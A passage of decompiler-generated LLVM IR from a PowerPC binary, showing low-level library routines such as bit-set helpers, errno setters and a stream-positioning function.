  ret i32 %v0_1000b880

; uselistorder directives
  uselistorder i32 %v0_1000b83c, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000b87c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b820, { 1, 0 }
}

define i32 @function_1000b894(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b894:
  %v1_1000b894 = add i32 %arg2, -1
  %v1_1000b898 = call i32 @__asm_rlwinm(i32 %v1_1000b894, i32 29, i32 3, i32 29)
  %v1_1000b89c = urem i32 %v1_1000b894, 32
  %v2_1000b8a0 = add i32 %v1_1000b898, %arg1
  %v3_1000b8a0 = inttoptr i32 %v2_1000b8a0 to i32*
  %v4_1000b8a0 = load i32, i32* %v3_1000b8a0, align 4
  %v3_1000b8a8 = shl i32 1, %v1_1000b89c
  %v2_1000b8ac = and i32 %v4_1000b8a0, %v3_1000b8a8
  %v2_1000b8b0 = icmp ne i32 %v2_1000b8ac, 0
  %v5_1000b8b4 = zext i1 %v2_1000b8b0 to i32
  ret i32 %v5_1000b8b4
}

define i32 @function_1000b8bc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b8bc:
  %v1_1000b8bc = add i32 %arg2, -1
  %v1_1000b8c4 = call i32 @__asm_rlwinm(i32 %v1_1000b8bc, i32 29, i32 3, i32 29)
  %v1_1000b8c8 = urem i32 %v1_1000b8bc, 32
  %v2_1000b8cc = add i32 %v1_1000b8c4, %arg1
  %v3_1000b8cc = inttoptr i32 %v2_1000b8cc to i32*
  %v4_1000b8cc = load i32, i32* %v3_1000b8cc, align 4
  %v3_1000b8d0 = shl i32 1, %v1_1000b8c8
  %v2_1000b8d4 = or i32 %v3_1000b8d0, %v4_1000b8cc
  store i32 %v2_1000b8d4, i32* %v3_1000b8cc, align 4
  ret i32 0
}

define i32 @function_1000b8e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b8e4:
  %v1_1000b8e4 = add i32 %arg2, -1
  %v1_1000b8ec = call i32 @__asm_rlwinm(i32 %v1_1000b8e4, i32 29, i32 3, i32 29)
  %v1_1000b8f0 = urem i32 %v1_1000b8e4, 32
  %v2_1000b8f4 = add i32 %v1_1000b8ec, %arg1
  %v3_1000b8f4 = inttoptr i32 %v2_1000b8f4 to i32*
  %v4_1000b8f4 = load i32, i32* %v3_1000b8f4, align 4
  %v3_1000b8f8 = shl i32 -2, %v1_1000b8f0
  %v4_1000b8f8 = sub nsw i32 32, %v1_1000b8f0
  %v5_1000b8f8 = lshr i32 -2, %v4_1000b8f8
  %v6_1000b8f8 = or i32 %v5_1000b8f8, %v3_1000b8f8
  %v2_1000b8fc = and i32 %v6_1000b8f8, %v4_1000b8f4
  store i32 %v2_1000b8fc, i32* %v3_1000b8f4, align 4
  ret i32 0
}

define i32 @function_1000b90c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b940.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_1000b924 = call i32 @function_100091f8()
  %v2_1000b92c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000b92c, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000b94434 = add i32 %v2_1000b92c, 124
  %v4_1000b94435 = inttoptr i32 %v3_1000b94434 to i32*
  store i32 0, i32* %v4_1000b94435, align 4
  %v0_1000b94836 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b94837 = add i32 %v0_1000b94836, -1
  store i32 %v1_1000b94837, i32* %r9.global-to-local, align 4
  %v0_1000b94c38 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b94c39 = add i32 %v0_1000b94c38, -1
  store i32 %v1_1000b94c39, i32* %ctr.global-to-local, align 4
  %v2_1000b94c40 = icmp eq i32 %v1_1000b94c39, 0
  br i1 %v2_1000b94c40, label %dec_label_pc_1000b950, label %dec_label_pc_1000b940.dec_label_pc_1000b940_crit_edge

dec_label_pc_1000b940.dec_label_pc_1000b940_crit_edge: ; preds = %dec_label_pc_1000b940.lr.ph, %dec_label_pc_1000b940.dec_label_pc_1000b940_crit_edge
  %v1_1000b94841 = phi i32 [ %v1_1000b948, %dec_label_pc_1000b940.dec_label_pc_1000b940_crit_edge ], [ %v1_1000b94837, %dec_label_pc_1000b940.lr.ph ]
  %v0_1000b944.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b944.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b940 = mul i32 %v1_1000b94841, 4
  %v3_1000b944 = add i32 %v1_1000b940, %v1_1000b944.pre
  %v4_1000b944 = inttoptr i32 %v3_1000b944 to i32*
  store i32 %v0_1000b944.pre, i32* %v4_1000b944, align 4
  %v0_1000b948 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b948 = add i32 %v0_1000b948, -1
  store i32 %v1_1000b948, i32* %r9.global-to-local, align 4
  %v0_1000b94c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b94c = add i32 %v0_1000b94c, -1
  store i32 %v1_1000b94c, i32* %ctr.global-to-local, align 4
  %v2_1000b94c = icmp eq i32 %v1_1000b94c, 0
  br i1 %v2_1000b94c, label %dec_label_pc_1000b950, label %dec_label_pc_1000b940.dec_label_pc_1000b940_crit_edge

dec_label_pc_1000b950:                            ; preds = %dec_label_pc_1000b940.dec_label_pc_1000b940_crit_edge, %dec_label_pc_1000b940.lr.ph
  %v1_1000b948.lcssa = phi i32 [ %v1_1000b94837, %dec_label_pc_1000b940.lr.ph ], [ %v1_1000b948, %dec_label_pc_1000b940.dec_label_pc_1000b940_crit_edge ]
  %v3_1000b958 = call i32 @function_1000b8bc(i32 %v2_1000b92c, i32 6, i32 %v1_1000b948.lcssa)
  %v3_1000b95c = icmp eq i32 %v3_1000b958, 0
  br i1 %v3_1000b95c, label %dec_label_pc_1000b964, label %dec_label_pc_1000b974

dec_label_pc_1000b964:                            ; preds = %dec_label_pc_1000b950
  store i32 268482932, i32* @lr, align 4
  %v3_1000b970 = call i32 @function_10009a04(i32 1, i32 %v2_1000b92c, i32 0)
  br label %dec_label_pc_1000b974

dec_label_pc_1000b974:                            ; preds = %dec_label_pc_1000b950, %dec_label_pc_1000b964
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b978 = load i32, i32* @global_var_100104d0.330, align 4
  %v3_1000b97c = icmp eq i32 %v3_1000b978, 0
  br i1 %v3_1000b97c, label %dec_label_pc_1000b984, label %dec_label_pc_1000b9ac

dec_label_pc_1000b984:                            ; preds = %dec_label_pc_1000b974
  store i32 1, i32* @global_var_100104d0.330, align 4
  br label %dec_label_pc_1000b98c

dec_label_pc_1000b98c:                            ; preds = %dec_label_pc_1000ba08, %dec_label_pc_1000b984
  store i32 ptrtoint (i32* @global_var_100103f8.328 to i32), i32* %r29.global-to-local, align 4
  %v0_1000b998 = call i32 @function_100091f8()
  store i32 268482980, i32* @lr, align 4
  %v1_1000b9a0 = call i32 @function_1000cefc(i32 6)
  %v0_1000b9a8 = call i32 @function_100091f8()
  %v3_1000b9b0.pre = load i32, i32* @global_var_100104d0.330, align 4
  br label %dec_label_pc_1000b9ac

dec_label_pc_1000b9ac:                            ; preds = %dec_label_pc_1000b974, %dec_label_pc_1000b98c
  %v0_1000ba24 = phi i32 [ %v3_1000b978, %dec_label_pc_1000b974 ], [ %v3_1000b9b0.pre, %dec_label_pc_1000b98c ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b9b4 = icmp eq i32 %v0_1000ba24, 1
  br i1 %v3_1000b9b4, label %dec_label_pc_1000b9f4.lr.ph, label %dec_label_pc_1000ba24

dec_label_pc_1000b9f4.lr.ph:                      ; preds = %dec_label_pc_1000b9ac
  %v2_1000b9c0 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_100104d0.330, align 4
  store i32 ptrtoint (i32* @global_var_1000b9d4.332 to i32), i32* @lr, align 4
  %v3_1000b9d0 = call i32 @function_100071a4(i32 %v2_1000b9c0, i32 0, i32 140)
  store i32 %v2_1000b92c, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_1000b94434, i32* %r9.global-to-local, align 4
  %v2_1000b9fc26 = add i32 %v2_1000b92c, 256
  %v3_1000b9fc27 = inttoptr i32 %v2_1000b9fc26 to i32*
  store i32 -1, i32* %v3_1000b9fc27, align 4
  %v0_1000ba0028 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ba0029 = add i32 %v0_1000ba0028, -1
  store i32 %v1_1000ba0029, i32* %r11.global-to-local, align 4
  %v0_1000ba0430 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ba0431 = add i32 %v0_1000ba0430, -1
  store i32 %v1_1000ba0431, i32* %ctr.global-to-local, align 4
  %v2_1000ba0432 = icmp eq i32 %v1_1000ba0431, 0
  br i1 %v2_1000ba0432, label %dec_label_pc_1000ba08, label %dec_label_pc_1000b9f4.dec_label_pc_1000b9f4_crit_edge

dec_label_pc_1000b9f4.dec_label_pc_1000b9f4_crit_edge: ; preds = %dec_label_pc_1000b9f4.lr.ph, %dec_label_pc_1000b9f4.dec_label_pc_1000b9f4_crit_edge
  %v1_1000ba0033 = phi i32 [ %v1_1000ba00, %dec_label_pc_1000b9f4.dec_label_pc_1000b9f4_crit_edge ], [ %v1_1000ba0029, %dec_label_pc_1000b9f4.lr.ph ]
  %v1_1000b9f8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000b9fc.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b9f4 = mul i32 %v1_1000ba0033, 4
  %v2_1000b9f8 = add i32 %v1_1000b9f4, %v1_1000b9f8.pre
  store i32 %v2_1000b9f8, i32* %r9.global-to-local, align 4
  %v2_1000b9fc = add i32 %v2_1000b9f8, 132
  %v3_1000b9fc = inttoptr i32 %v2_1000b9fc to i32*
  store i32 %v0_1000b9fc.pre, i32* %v3_1000b9fc, align 4
  %v0_1000ba00 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ba00 = add i32 %v0_1000ba00, -1
  store i32 %v1_1000ba00, i32* %r11.global-to-local, align 4
  %v0_1000ba04 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ba04 = add i32 %v0_1000ba04, -1
  store i32 %v1_1000ba04, i32* %ctr.global-to-local, align 4
  %v2_1000ba04 = icmp eq i32 %v1_1000ba04, 0
  br i1 %v2_1000ba04, label %dec_label_pc_1000ba08, label %dec_label_pc_1000b9f4.dec_label_pc_1000b9f4_crit_edge

dec_label_pc_1000ba08:                            ; preds = %dec_label_pc_1000b9f4.dec_label_pc_1000b9f4_crit_edge, %dec_label_pc_1000b9f4.lr.ph
  store i32 268483104, i32* @lr, align 4
  %v4_1000ba1c = call i32 @function_1000b7d0(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000b98c

dec_label_pc_1000ba24:                            ; preds = %dec_label_pc_1000b9ac
  %v3_1000ba24 = icmp eq i32 %v0_1000ba24, 2
  br i1 %v3_1000ba24, label %dec_label_pc_1000ba2c, label %dec_label_pc_1000ba38

dec_label_pc_1000ba2c:                            ; preds = %dec_label_pc_1000ba24
  store i32 3, i32* @global_var_100104d0.330, align 4
  br label %dec_label_pc_1000ba38

dec_label_pc_1000ba38:                            ; preds = %dec_label_pc_1000ba24, %dec_label_pc_1000ba2c
  %v3_1000ba38 = phi i32 [ %v0_1000ba24, %dec_label_pc_1000ba24 ], [ 3, %dec_label_pc_1000ba2c ]
  %v1_1000ba40 = icmp ne i32 %v3_1000ba38, 3
  call void @__pseudo_cond_branch(i1 %v1_1000ba40, i32 268483156)
  store i32 4, i32* @global_var_100104d0.330, align 4
  %v1_1000ba50 = call i32 @function_10009690(i32 127)
  ret i32 %v1_1000ba50

; uselistorder directives
  uselistorder i32 %v1_1000ba04, { 1, 0 }
  uselistorder i32 %v1_1000ba00, { 1, 0 }
  uselistorder i32 %v1_1000b94c, { 1, 0 }
  uselistorder i32 %v1_1000b948, { 0, 2, 1 }
  uselistorder i32 %v2_1000b92c, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32)* @function_10009690, { 1, 0, 2 }
  uselistorder i32 127, { 1, 4, 0, 3, 5, 2 }
  uselistorder i32 (i32, i32*, i32)* @function_1000b7d0, { 1, 0 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_100104d0.330, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @function_10009a04, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_1000b8bc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ba38, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9f4.dec_label_pc_1000b9f4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000b974, { 1, 0 }
  uselistorder label %dec_label_pc_1000b940.dec_label_pc_1000b940_crit_edge, { 1, 0 }
}

define i32 @function_1000ba5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000ba5c:
  %v1_1000ba5c = add i32 %arg1, 28
  %v2_1000ba5c = inttoptr i32 %v1_1000ba5c to i32*
  %v3_1000ba5c = load i32, i32* %v2_1000ba5c, align 4
  store i32 %v3_1000ba5c, i32* @global_var_100104d4.333, align 4
  %v1_1000ba6c = add i32 %arg1, 44
  %v2_1000ba6c = inttoptr i32 %v1_1000ba6c to i32*
  %v3_1000ba6c = load i32, i32* %v2_1000ba6c, align 4
  store i32 %v3_1000ba6c, i32* @global_var_100104d8.334, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @function_1000ba78() local_unnamed_addr {
dec_label_pc_1000ba78:
  %v0_1000ba84 = load i32, i32* @r3, align 4
  store i32 %v0_1000ba84, i32* @r29, align 4
  %v0_1000ba8c = call i32 @function_10004e38()
  %v0_1000ba90 = load i32, i32* @r29, align 4
  %v2_1000ba90 = inttoptr i32 %v0_1000ba8c to i32*
  store i32 %v0_1000ba90, i32* %v2_1000ba90, align 4
  ret i32 -1
}

define i32 @function_1000baac(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000baac:
  store i32 %arg1, i32* @global_var_100104dc.296, align 4
  %v0_1000bad4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000bad4)
  store i32 12, i32* @r3, align 4
  %v0_1000badc = call i32 @function_1000ba78()
  ret i32 %v0_1000badc

; uselistorder directives
  uselistorder i32 ()* @function_1000ba78, { 1, 0 }
  uselistorder i32* @global_var_100104dc.296, { 1, 0, 2 }
}

define i32 @function_1000bae0() local_unnamed_addr {
dec_label_pc_1000bae0:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000baf8 = call i32 @__asm_mfcr()
  %v1_1000bafc = and i32 %v0_1000baf8, 268435456
  %v3_1000bafc = icmp eq i32 %v1_1000bafc, 0
  store i32 %v0_1000baf8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000bafc, label %dec_label_pc_1000bb14, label %dec_label_pc_1000bb08

dec_label_pc_1000bb08:                            ; preds = %dec_label_pc_1000bae0
  %v0_1000bb08 = call i32 @function_10004e38()
  %v0_1000bb0c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000bb0c = inttoptr i32 %v0_1000bb08 to i32*
  store i32 %v0_1000bb0c, i32* %v2_1000bb0c, align 4
  br label %dec_label_pc_1000bb14

dec_label_pc_1000bb14:                            ; preds = %dec_label_pc_1000bae0, %dec_label_pc_1000bb08
  %v0_1000bb24 = phi i32 [ %v0_1000baf8, %dec_label_pc_1000bae0 ], [ -1, %dec_label_pc_1000bb08 ]
  ret i32 %v0_1000bb24

; uselistorder directives
  uselistorder label %dec_label_pc_1000bb14, { 1, 0 }
}

define i32 @function_1000bb28(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bb28:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000bb40 = call i32 @__asm_mfcr()
  %v1_1000bb44 = and i32 %v0_1000bb40, 268435456
  %v3_1000bb44 = icmp eq i32 %v1_1000bb44, 0
  store i32 %v0_1000bb40, i32* %r31.global-to-local, align 4
  br i1 %v3_1000bb44, label %dec_label_pc_1000bb5c, label %dec_label_pc_1000bb50

dec_label_pc_1000bb50:                            ; preds = %dec_label_pc_1000bb28
  %v0_1000bb50 = call i32 @function_10004e38()
  %v0_1000bb54 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000bb54 = inttoptr i32 %v0_1000bb50 to i32*
  store i32 %v0_1000bb54, i32* %v2_1000bb54, align 4
  br label %dec_label_pc_1000bb5c

dec_label_pc_1000bb5c:                            ; preds = %dec_label_pc_1000bb28, %dec_label_pc_1000bb50
  %v0_1000bb6c = phi i32 [ %v0_1000bb40, %dec_label_pc_1000bb28 ], [ -1, %dec_label_pc_1000bb50 ]
  ret i32 %v0_1000bb6c

; uselistorder directives
  uselistorder label %dec_label_pc_1000bb5c, { 1, 0 }
}

define i32 @function_1000bb70(i16* %arg1) local_unnamed_addr {
dec_label_pc_1000bb70:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000bb70 = load i32, i32* @r5, align 4
  %v0_1000bb74 = load i32, i32* @r4, align 4
  %tmp10 = icmp slt i32 %v0_1000bb74, 0
  %v1_1000bb78 = zext i1 %tmp10 to i32
  %v2_1000bb78 = ashr i32 %v0_1000bb74, 31
  %v3_1000bb78 = and i32 %v2_1000bb78, -2
  %v4_1000bb78 = or i32 %v3_1000bb78, %v1_1000bb78
  %v0_1000bb84 = load i32, i32* @lr, align 4
  store i32 %v0_1000bb84, i32* %r0.global-to-local, align 4
  store i32 %v0_1000bb70, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v4_1000bb78, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_1000bb70, 3
  br i1 %tmp9, label %dec_label_pc_1000bbbc, label %dec_label_pc_1000bba8

dec_label_pc_1000bba8:                            ; preds = %dec_label_pc_1000bb70
  %v0_1000bba8 = call i32 @function_10004e38()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000bbb4 = inttoptr i32 %v0_1000bba8 to i32*
  store i32 22, i32* %v2_1000bbb4, align 4
  br label %dec_label_pc_1000bc84

dec_label_pc_1000bbbc:                            ; preds = %dec_label_pc_1000bb70
  %v2_1000bbbc = add i32 %tmp, 52
  %v3_1000bbbc = inttoptr i32 %v2_1000bbbc to i32*
  %v4_1000bbbc = load i32, i32* %v3_1000bbbc, align 4
  store i32 %v4_1000bbbc, i32* @r28, align 4
  %v3_1000bbc0 = icmp eq i32 %v4_1000bbbc, 0
  br i1 %v3_1000bbc0, label %dec_label_pc_1000bbc8, label %dec_label_pc_1000bbe8

dec_label_pc_1000bbc8:                            ; preds = %dec_label_pc_1000bbbc
  %v2_1000bbc8 = add i32 %tmp, 56
  store i32 %v2_1000bbc8, i32* @r29, align 4
  %v2_1000bbd0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000bbd0, i32* @r3, align 4
  %v0_1000bbdc = call i32 @function_10009200()
  %v0_1000bbe4 = call i32 @function_100091f8()
  %v0_1000bbe8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bbe8

dec_label_pc_1000bbe8:                            ; preds = %dec_label_pc_1000bbbc, %dec_label_pc_1000bbc8
  %v0_1000bbf4 = phi i32 [ %tmp, %dec_label_pc_1000bbbc ], [ %v0_1000bbe8.pre, %dec_label_pc_1000bbc8 ]
  %v1_1000bbe8 = inttoptr i32 %v0_1000bbf4 to i16*
  %v2_1000bbe8 = load i16, i16* %v1_1000bbe8, align 2
  %v3_1000bbe8 = zext i16 %v2_1000bbe8 to i32
  store i32 %v3_1000bbe8, i32* %r0.global-to-local, align 4
  %v1_1000bbec = and i32 %v3_1000bbe8, 64
  store i32 %v1_1000bbec, i32* %r9.global-to-local, align 4
  %v3_1000bbec = icmp eq i32 %v1_1000bbec, 0
  br i1 %v3_1000bbec, label %dec_label_pc_1000bc04, label %dec_label_pc_1000bbf4

dec_label_pc_1000bbf4:                            ; preds = %dec_label_pc_1000bbe8
  store i32 %v0_1000bbf4, i32* @r3, align 4
  store i32 268483580, i32* @lr, align 4
  %v0_1000bbf8 = call i32 @function_10005834()
  %v3_1000bbfc = icmp eq i32 %v0_1000bbf8, 0
  br i1 %v3_1000bbfc, label %dec_label_pc_1000bc04, label %dec_label_pc_1000bc6c

dec_label_pc_1000bc04:                            ; preds = %dec_label_pc_1000bbf4, %dec_label_pc_1000bbe8
  %v0_1000bc04 = load i32, i32* @r30, align 4
  %v3_1000bc04 = icmp eq i32 %v0_1000bc04, 1
  br i1 %v3_1000bc04, label %dec_label_pc_1000bc0c, label %dec_label_pc_1000bc04.dec_label_pc_1000bc20_crit_edge

dec_label_pc_1000bc04.dec_label_pc_1000bc20_crit_edge: ; preds = %dec_label_pc_1000bc04
  br label %dec_label_pc_1000bc20

dec_label_pc_1000bc0c:                            ; preds = %dec_label_pc_1000bc04
  %v0_1000bc0c = load i32, i32* @r31, align 4
  %v1_1000bc0c = inttoptr i32 %v0_1000bc0c to i16*
  %v2_1000bc10 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268483608, i32* @lr, align 4
  %v4_1000bc14 = call i32 @function_1000bd10(i16* %v1_1000bc0c, i32 %v2_1000bc10)
  %v1_1000bc18 = icmp slt i32 %v4_1000bc14, 0
  br i1 %v1_1000bc18, label %dec_label_pc_1000bc6c, label %dec_label_pc_1000bc0c.dec_label_pc_1000bc20_crit_edge

dec_label_pc_1000bc0c.dec_label_pc_1000bc20_crit_edge: ; preds = %dec_label_pc_1000bc0c
  %v0_1000bc20.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000bc20

dec_label_pc_1000bc20:                            ; preds = %dec_label_pc_1000bc04.dec_label_pc_1000bc20_crit_edge, %dec_label_pc_1000bc0c.dec_label_pc_1000bc20_crit_edge
  %v0_1000bc20 = phi i32 [ %v0_1000bc04, %dec_label_pc_1000bc04.dec_label_pc_1000bc20_crit_edge ], [ %v0_1000bc20.pre, %dec_label_pc_1000bc0c.dec_label_pc_1000bc20_crit_edge ]
  %v0_1000bc24 = load i32, i32* @r31, align 4
  store i32 268483632, i32* @lr, align 4
  %v5_1000bc2c = call i32 @function_1000bef8(i32 %v0_1000bc24, i32* nonnull %stack_var_-56, i32 %v0_1000bc20)
  %v1_1000bc30 = icmp slt i32 %v5_1000bc2c, 0
  br i1 %v1_1000bc30, label %dec_label_pc_1000bc6c, label %dec_label_pc_1000bc38

dec_label_pc_1000bc38:                            ; preds = %dec_label_pc_1000bc20
  %v0_1000bc38 = load i32, i32* @r31, align 4
  %v1_1000bc38 = inttoptr i32 %v0_1000bc38 to i16*
  %v2_1000bc38 = load i16, i16* %v1_1000bc38, align 2
  %v3_1000bc38 = zext i16 %v2_1000bc38 to i32
  store i32 %v3_1000bc38, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000bc40 = add i32 %v0_1000bc38, 8
  %v2_1000bc40 = inttoptr i32 %v1_1000bc40 to i32*
  %v3_1000bc40 = load i32, i32* %v2_1000bc40, align 4
  store i32 %v3_1000bc40, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000bc48 = and i32 %v3_1000bc38, 65464
  store i32 %v1_1000bc48, i32* %r0.global-to-local, align 4
  %v3_1000bc4c = add i32 %v0_1000bc38, 2
  %v4_1000bc4c = inttoptr i32 %v3_1000bc4c to i8*
  store i8 0, i8* %v4_1000bc4c, align 1
  %v0_1000bc50 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc50 = load i32, i32* @r31, align 4
  %v2_1000bc50 = add i32 %v1_1000bc50, 28
  %v3_1000bc50 = inttoptr i32 %v2_1000bc50 to i32*
  store i32 %v0_1000bc50, i32* %v3_1000bc50, align 4
  %v0_1000bc54 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bc54 = trunc i32 %v0_1000bc54 to i16
  %v2_1000bc54 = load i32, i32* @r31, align 4
  %v3_1000bc54 = inttoptr i32 %v2_1000bc54 to i16*
  store i16 %v1_1000bc54, i16* %v3_1000bc54, align 2
  %v0_1000bc58 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc58 = load i32, i32* @r31, align 4
  %v2_1000bc58 = add i32 %v1_1000bc58, 16
  %v3_1000bc58 = inttoptr i32 %v2_1000bc58 to i32*
  store i32 %v0_1000bc58, i32* %v3_1000bc58, align 4
  %v0_1000bc5c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc5c = load i32, i32* @r31, align 4
  %v2_1000bc5c = add i32 %v1_1000bc5c, 20
  %v3_1000bc5c = inttoptr i32 %v2_1000bc5c to i32*
  store i32 %v0_1000bc5c, i32* %v3_1000bc5c, align 4
  %v0_1000bc60 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc60 = load i32, i32* @r31, align 4
  %v2_1000bc60 = add i32 %v1_1000bc60, 24
  %v3_1000bc60 = inttoptr i32 %v2_1000bc60 to i32*
  store i32 %v0_1000bc60, i32* %v3_1000bc60, align 4
  %v0_1000bc64 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bc64 = load i32, i32* @r31, align 4
  %v2_1000bc64 = add i32 %v1_1000bc64, 44
  %v3_1000bc64 = inttoptr i32 %v2_1000bc64 to i32*
  store i32 %v0_1000bc64, i32* %v3_1000bc64, align 4
  br label %dec_label_pc_1000bc70

dec_label_pc_1000bc6c:                            ; preds = %dec_label_pc_1000bbf4, %dec_label_pc_1000bc20, %dec_label_pc_1000bc0c
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1000bc70

dec_label_pc_1000bc70:                            ; preds = %dec_label_pc_1000bc38, %dec_label_pc_1000bc6c
  %v0_1000bc70 = load i32, i32* @r28, align 4
  %v3_1000bc70 = icmp eq i32 %v0_1000bc70, 0
  br i1 %v3_1000bc70, label %dec_label_pc_1000bc78, label %dec_label_pc_1000bc84

dec_label_pc_1000bc78:                            ; preds = %dec_label_pc_1000bc70
  %v2_1000bc78 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000bc78, i32* @r3, align 4
  %v0_1000bc80 = call i32 @function_10009200()
  br label %dec_label_pc_1000bc84

dec_label_pc_1000bc84:                            ; preds = %dec_label_pc_1000bc70, %dec_label_pc_1000bba8, %dec_label_pc_1000bc78
  store i32 %v0_1000bb84, i32* %r0.global-to-local, align 4
  %v0_1000bc88 = load i32, i32* @r30, align 4
  ret i32 %v0_1000bc88

; uselistorder directives
  uselistorder i32 %v0_1000bb74, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @function_100091f8, { 6, 4, 3, 2, 41, 40, 39, 38, 37, 36, 0, 42, 48, 47, 18, 34, 33, 32, 31, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 35, 29, 28, 27, 26, 25, 30, 5, 24, 46, 1, 23, 22, 45, 44, 43, 21, 20, 19 }
  uselistorder i32 ()* @function_10009200, { 5, 4, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 1, 0, 47, 46, 59, 58, 57, 56, 7, 6, 33, 32, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 31, 30, 3, 2, 19, 18, 55, 54, 17, 16, 15, 14, 53, 52, 51, 50, 49, 48, 13, 12, 11, 10, 9, 8 }
  uselistorder i32 56, { 3, 5, 1, 4, 0, 2 }
  uselistorder i32 52, { 9, 10, 12, 1, 3, 6, 2, 11, 7, 8, 0, 4, 5 }
  uselistorder i32 22, { 0, 14, 1, 10, 2, 11, 12, 3, 16, 4, 15, 5, 6, 13, 7, 8, 9 }
  uselistorder label %dec_label_pc_1000bc84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000bc70, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000bc20, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbe8, { 1, 0 }
}

define i32 @function_1000bc9c(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bc9c:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000bca8 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
